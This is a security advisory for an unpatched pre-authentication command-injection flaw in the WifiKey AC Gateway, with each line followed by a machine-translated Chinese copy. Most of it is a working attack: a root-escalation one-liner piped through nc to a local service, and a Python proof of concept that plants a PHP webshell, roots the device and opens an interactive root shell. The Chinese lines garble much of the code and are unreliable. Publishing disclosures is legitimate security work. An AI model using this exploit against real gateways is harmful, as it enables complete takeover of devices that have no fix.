

# SSD ADVISORY -WIFI AC 网关预认证 RCE

**Summary 总结**

A vulnerability exists in WifiKey’s AC Gateway allowing remote attackers to trigger a pre-auth RCE vulnerability in the product allowing complete compromise of the device.  
WifiKey 的 AC 网关中存在一个漏洞，使得远程攻击者能够触发产品中的预认证 RCE 漏洞，从而完全危害设备。

**Credit 信用**

An independent security researcher working with SSD Secure Disclosure.  
一个独立的安全研究人员与 SSD 安全披露工作。

**Affected Versions 影响版本**

WifiKey AC Gateway WifiKey AC 网关

**Vendor Response 销售商应答**

We have emailed the vendor and again after 30 days, but have received no response from them. There is no known patch at this time for these vulnerabilities.  
我们已经给供应商发了电子邮件，30 天后又发了一次，但没有收到他们的回复。目前还没有针对这些漏洞的已知修补程序。

**Technical Analysis 技术分析**

The WifiKey AC Gateway includes a file located at `www/portal/ibilling/index.php`, this file is accessible to users without authentication – accessing it shows no information, but inspection of its content will show:  
WifiKey AC 网关包括一个位于 `www/portal/ibilling/index.php` 的文件，用户无需身份验证即可访问该文件 - 访问它不会显示任何信息，但检查其内容将显示：

<?php <？PHP

include('../../config/ibilling.php');  
包含（'../../ php.php'）;

$post = file\_get\_contents("php://input");  
$post = file\_get\_contents（“php：//input”）;

$json = json\_decode($post, true);  
$json = json\_decode（$post，true）;

$type = $json\['type'\]; $type = $json“type”\];

$version = $json\['version'\];  
$version = $json“version”\];

$ip = $json\['user-ip'\]; $json = $json“user-ip'\];

$user = $json\['user-name'\];  
$user = $json \[“user-name”\];

$passwd = $json\['user-passwd'\];  
$passwd = $json“user-passwd”\];

$serial = $json\['serial-no'\];  
$serial = $json“serial-no”\];

$bypass = $json\['bypass'\] ? $json\['bypass'\] : 10;  
$bypass = $json“bypass”\]？$json“bypass”\]：10;

$rep = new Crypt3Des(); $ref = new MyNode（）;

$rep-\>key($CONFIG\_AUTH\_IBILLING\_KEY);  
$rep->key（$CONFIG\_AUTH\_IBILLING\_KEY）;

$radius = new radius(); $currency = new currency（）;

$passwd = $rep-\>decrypt($passwd);  
$passwd = $rep->decrypt（$passwd）;

if ($type == '1') {  
if（$type == '1'）{

if ($radius-\>login($ip, $user, $passwd) != 0) {  
if（$radius->login（$ip，$user，$passwd）！= 0){1}

echo json\_encode(array('error-code' =\> 1, 'error-msg' =\> ($radius-\>error())));  
echo json\_encode (array ('error-code' => 1,'error-msg' =>($radius->error ();

return;  
返回;

}

echo json\_encode(array('type' =\> '2', 'error-code' =\> 0, 'error-msg' =\> 'success', 'serial-no' =\> $serial, 'len' =\> 250));  
echo json\_encode (array ('type' => '2','error-code' => 0,'error-msg' => ' success ','serial-no' => $serial,'len' => 250));

} else if ($type == '3') {  
} else if（$type == '3'）{

if ($radius-\>logout($ip) != 0) {  
if（$radius->logout（$ip）！= 0){1}

echo json\_encode(array('error-code' =\> 1, 'error-msg' =\> ($radius-\>error())));  
echo json\_encode (array ('error-code' => 1,'error-msg' =>($radius->error ();

return;  
返回;

}

echo json\_encode(array('type' =\> '4', 'error-code' =\> 0, 'error-msg' =\> 'success', 'serial-no' =\> $serial, 'len' =\> 250));  
echo json\_encode (array ('type' => '4','error-code' => 0,'error-msg' => ' success ','serial-no' => $serial,'len' => 250));

} else if ($type == '5') {  
} else if（$type == '5'）{

@exec("/usr/hls/bin/arctl -m pass -i $ip -t $bypass", $info);  
@exec（“/usr/hls/bin/arctl -m pass -i $ip -t $bypass”，$info）;

echo json\_encode(array('type' =\> '6', 'error-code' =\> 0, 'error-msg' =\> 'success', 'serial-no' =\> $serial, 'len' =\> 250));  
echo json\_encode (array ('type' => '6','error-code' => 0,'error-msg' => ' success ','serial-no' => $serial,'len' => 250));

}

As you can see the snippet doesn’t require any authorisation, while looking on the file you will notice the `exec` function accepts two parameters `$ip` and `$bypass`. If we change the type value to `5` the user can control the `$ip` value. Since there is no any escaping method we can execute any commands.  
正如你所看到的，这个代码片段不需要任何授权，在查看文件时，你会注意到 `exec` 函数接受两个参数 `$ip` 和 `$bypass` 。如果我们将 type 值更改为 `5` ，则用户可以控制 `$ip` 值。由于没有任何转义方法，我们可以执行任何命令。

**Rooting 生根**

While the above RCE will get you limited access (running as the web user) a service running on the device on port `1981` can be used to gain elevated privileges, this can be simply done by issuing the following command:  
虽然上面的 RCE 将为您提供有限的访问权限（作为 Web 用户运行），但可以使用在端口 `1981` 上的设备上运行的服务来获得提升的权限，这可以通过发出以下命令来简单地完成：

echo tcpdump capture dev lo count 2 expr '$(id>/www/i.txt)'|nc 127.0.0.1 1981  
echo tcpdump capture dev lo count 2 expr '$(id>/www/i.txt)'| 127.0.0.1 1981

**Proof of Concept 概念验证**

#!/usr/bin/python3

import sys

from time import sleep 从时间导入睡眠

import readline 导入读取行

from base64 import b64encode as base64\_encode  
从 base64 导入 b64 encode 作为 base64\_encode

import requests 导入请求

import binascii 进口比纳斯

from requests.packages.urllib3.exceptions import InsecureRequestWarning  
从 requests.packages.urllib3.exceptions 导入 InsecureRequestWarning

requests.packages.urllib3.disable\_warnings(InsecureRequestWarning)  
requests.packages.urllib3.disable\_warnings (InsecureRequestWarning)

ROOT\_SCR = """cat > /tmp/.r << \_EOT  
ROOT\_SCR =“cat > /tmp/.r << \_EOT

#!/bin/sh

touch /tmp/.rdie 触摸/tmp/.rdie

sleep 1 休眠 1

rm -rf /tmp/.rdie /tmp/.r

killall -9 tcpdump tcpdump tcpdump

while true; do 当为真时

if \[ -e /tmp/.rcmd \] && \[ -f /tmp/.rcmd \]; then  
如果\[ -e /tmp/.rcmd \] && \[ -f /tmp/.rcmd \];则

touch /tmp/.cmdout  
触摸/tmp/. xmlout

chmod 777 /tmp/.cmdout  
chmod 777 /tmp/. xmlout

chwon 100:33 /tmp/.cmdout  
chwon 100:33 /tmp/. callout

cat /tmp/.rcmd | sh >>/tmp/.cmdout 2>>/tmp/.cmdout &  
cat /tmp/.rcmd| sh >>/tmp/. cloudout 2>>/tmp/. cloudout &

sleep 1  
休眠 1

rm -rf /tmp/.rcmd

fi

if \[ -e /tmp/.rdie \];then  
如果\[ -e /tmp/.rdie \];则

rm -rf /tmp/.rdie /tmp/.rcmd /tmp/.cmdout  
rm -rf /tmp/.rdie /tmp/.rcmd /tmp/. rcmout

exit 1  
1 号出口

fi

done 做

\_EOT

echo tcpdump capture dev lo count 2 expr '$(cat${IFS}/tmp/.r|sh${IFS}>/dev/null${IFS}2>/dev/null${IFS}&)' | nc 127.0.0.1 1981  
echo tcpdump capture dev lo count 2 expr '$(cat${IFS}/tmp/.r| sh${IFS}>/dev/null${IFS}2>/dev/null${IFS}&)'| 127.0.0.1 1981

echo 'echo Rooted;id;pwd;uname -a' > /tmp/.rcmd

sleep 1 休眠 1

cat /tmp/.cmdout && rm -rf /tmp/.cmdout 2>/dev/null  
cat /tmp/. cloudout && rm -rf /tmp/. cloudout 2>/dev/null

"""

class RouterRCE: 类 RouterRCE：

def \_\_init\_\_(self, target):  
def \_\_init\_\_（self，target）：

self.target = target.strip("/")  
self.target = target.strip（“/”）

payload\_plain = """<?php  
payload\_plain =“"<？PHP

if (isset($\_FILES\['shs'\])) {  
if（$\_FILES\_shs '\]））{

$fname = $\_FILES\['shs'\]\['tmp\_name'\];  
$fname = $\_FILES \[“shs”\]“tmp\_name”\];

echo shell\_exec("sh $fname 2\>&1");  
echo shell\_exec (“sh $fname 2>&1”);

}

if (isset($\_REQUEST\['pc'\])) {  
if（$\_REQUEST\_name '）{

eval($\_REQUEST\['pc'\]);  
return（$\_REQUEST）;

}

if (isset($\_REQUEST\['g'\])) {  
if（$\_REQUEST\_name）{

$c = $\_REQUEST\['g'\];  
$c = $\_REQUEST“g”\];

echo shell\_exec("$c 2\>&1");  
echo shell\_exec ($c 2>&1);

}""" }"””

payload = binascii.hexlify(payload\_plain.encode("latin1"), sep="x").decode()  
payload = binasplane.hexlify (payload\_plain.encode (“latin1”), sep=“x”).decode ()

payload = "x" + payload  
有效载荷=“x” + 有效载荷

payload = payload.replace("x", "\\\\x")  
payload = payload.replace (“x”,“\\\\x”)

self.payload = (  
payload =（

f";echo -e '{payload}' > "  
f”;echo -e“{payload}”>“

"/tmp/.ff;echo tcpdump capture dev lo count 2 expr "  
“/tmp/.ff;echo tcpdump capture dev lo count 2 expr“

"'$(mv${IFS}/tmp/.ff${IFS}/www/ix.php)'|nc 127.0.0.1 1981;"  
“'$（mv${IFS}/tmp/.ff${IFS}/www/ix.php）'| nc 127.0.0.1 1981;”

)

self.headers = {  
self. header = {

"User-Agent": "Mozilla/5.0 (X11; Linux x86\_64; rv:109.0) Gecko/20100101 Firefox/118.0",  
“User-Agent”：“Mozilla/5.0（X11; Linux x86\_64; rv：109.0）Gecko/20100101 Firefox/118.0”，

"Accept": "\*/\*",  
“接受”：“\*/\*"，

"Connection": "close",  
“连接”：“关闭”，

}

def Checker(self):  
define（self）：

r = requests.get(self.target, verify=False, headers=self.headers, timeout=1)  
r = requests.get（self.target，verify=False，headers=self.headers，timeout=1）

if (  
如果（

"<title>碧海威 L7 云路由无线运营版</title>" in r.text

or "<title>WIFISKY 7 层流控路由器</title>" in r.text  
或“WIFISKY 7 流控路由器“在 r.text 中

):

path = requests.get(  
path = requests.get（

self.target + "/portal/ibilling/index.php", verify=False, timeout=1  
self.target“/portal/ibilling/index.php”，verify=False，timeout=1

)

if path.status\_code == 200:  
如果 path.status\_code == 200：

print("Checking is Done..")  
print（“Checking is Done..“）

return True  
返回 True

def exploit(self):  
def exploit（self）：

print("Sending Paylod")  
print（“正在发送工资单”）

r = requests.post(  
2019 - 05 - 25 requests.post01:02

self.target + "/portal/ibilling/index.php",  
self.target“/portal/ibilling/index.php”，

json={"type": "5", "user-ip": self.payload, "bypass": "AAAA"},  
json={“type”：“5”，“user-ip”：self.payload，“bypass”：“AAAA”}，

verify=False,  
verify=False，

headers=self.headers,  
header =self. header，

timeout=1,  
timeout=1，

)

if r.status\_code != 200 or r.text.find("error-code") == \-1:  
if r.status\_code！= 200 或 r.text.find（“error-code”）== -1：

print("Error exploiting target")  
print（“利用目标时出错”）

print(r.status\_code)  
print（r.status\_code）

print(r.text)  
print（r.text）

return False  
返回 False

print(f"Status Code: {r.status\_code}, Response: {r.json()}")  
print（f“状态代码：{r.status\_code}，响应：{r.json（）}”）

print("Verifying webshell...")  
print（“打印 webshell.“）

tot = 30  
总计= 30

c = 0

up = False  
上=假

while c < tot:  
当 c < tot 时：

b = requests.post(  
B = requests.post（

self.target + "/ix.php",  
self.target“/ix.php”，

data={"g": "echo SHELL\_UPLOAD;id;pwd"},  
data={“g”：“echo SHELL\_UPLOAD;id;pwd”}，

verify=False,  
verify=False，

timeout=1,  
timeout=1，

)

if b.status\_code == 200 and b.text.find("SHELL\_UPLOAD") != \-1:  
如果 B.status\_code == 200 且 B.text.find（“SHELL\_UPLOAD”）！= -1：

sys.stdout.write(f"\\nShell confirmed in {c} seconds.\\n")  
sys.stdout.write（f”\\nShell 已在{c}秒内确认。\\ n”）

sys.stdout.flush()  
sys.stdout.flush（）

up = True  
上=真

break  
打破

sys.stdout.write(".")  
sys.stdout.write（“.“）

sys.stdout.flush()  
sys.stdout.flush（）

sleep(1)  
睡眠（1）

c += 1

if not up:  
如果不向上：

return False  
返回 False

print("Shell uploaded.")  
print（“Shell 已上传。“）

return True  
返回 True

def shell(self):  
def shell（self）：

print("\\nStarting shell execution")  
print（“\\n正在启动 shell 执行”）

print("Rooting server")  
print（“根服务器”）

b = requests.post(  
B = requests.post（

self.target + "/ix.php", files={"shs": ROOT\_SCR}, verify=False, timeout=1  
self.target“/ix.php”，files={“shs”：ROOT\_SCR}，verify=False，timeout=1

)

if b.status\_code != 200 or b.text.find("uid=0(root)") == \-1:  
如果 B.status\_code！= 200 或 B.text.find（“uid=0（root）”）== -1：

print("\\n- Rooting the server failed, Please do that manually.")  
print（“\\n-根服务器失败，请手动完成。“）

print(b.status\_code)  
print（B.status\_code）

print(b.text)  
打印（B.文本）

else:  
否则：

print("- Server rooted.")  
print（“-服务器 root。“）

print("+ Debug output: ")  
print（“+“）

print(b.text)  
打印（B.文本）

print("\\nStarting webshell, Use quit to exit.\\n")  
print（“\\n正在启动 webshell，使用 quit 退出。\\ n”）

readline.parse\_and\_bind("set editing-mode emacs")  
readline.parse\_and\_bind（“设置 emacs 编辑模式”）

while True:  
为真时：

cmd = input(f"root@\[{self.target}\]# ")  
cmd = input（f“root@\[{self.target}\]#“）

if cmd.strip() in \["exit", "quit"\]:  
if cmd.strip () in \[“exit”，“quit”\]：

print("Exiting")  
print（“Exiting”）

return True  
返回 True

cmd\_enc = base64\_encode(cmd.encode()).decode()  
cmd\_enc = base64\_encode (cmd.encode ()).decode ()

mycmd = (  
mysql =（

f'$command = base64\_decode("{cmd\_enc}");file\_put\_contents("/tmp/.rcmd", '  
f'$command = base64\_decode（“{cmd\_enc}”）;file\_put\_contents（“/tmp/.rcmd”，'

'"$command\\\\n");sleep(1);echo file\_get\_contents("/tmp/.cmdout");'  
“"$command\\\\n”）;sleep（1）;echo file\_get\_contents（“/tmp/. xmlout”）;“

'file\_put\_contents("/tmp/.cmdout","");'  
“file\_put\_contents（“/tmp/. js”，””）;“

)

b = requests.post(  
B = requests.post（

self.target + "/ix.php", data={"pc": mycmd}, verify=False, timeout=1  
self.target“/ix.php”，data={“pc”：mycmd}，verify=False，timeout=1

)

print(b.text)  
打印（B.文本）

def run(self):  
默认运行（自身）：

if not self.Checker():  
if not self. self（）：

print("Target isn't Vulnerable")  
print（“目标不脆弱”）

return  
返回

print("Target is Vulnerable Sending Payload")  
print（“Target is Vulnerable Sending Payload”）

if not self.exploit():  
如果没有 self.exploit（）：

exit("Exploitation Failed Something is wrong")  
exit（“Exploitation Failed Something is wrong”）

return self.shell()  
return self.shell（）

def usage(): def usage（）：

print(f"\[-\] {sys.argv\[0\]} http(s)://target\_url")  
print（f”\[-\] {sys.argv\[0\]} http（s）：//target\_url”）

def main(): 定义 main（）：

if sys.version\_info\[0\] != 3:  
如果系统版本信息\[0\]！=第三章：

print("Use Python 3 to run this Script.")  
print（“使用 Python 3 运行此脚本。“）

sys.exit(\-1)  
系统退出（-1）

if len(sys.argv) < 2:  
如果 len（sys.argv）< 2：

usage()  
usage（）

sys.exit(\-1)  
系统退出（-1）

RouterRCE(sys.argv\[1\]).run()  
RouterRCE (sys.argv\[1\]）.run（）

if \_\_name\_\_ == "\_\_main\_\_":  
如果\_\_名称\_\_ ==“\_\_主要\_\_"：

try:  
尝试：

main()  
主要（）

except KeyboardInterrupt:  
键盘中断除外：

print("\*CRT+C Received.\* ====> Aborting")  
print（“\*CRT+C 已接收。\* =>正在中止”）

sys.exit(\-1)  
系统退出（-1）
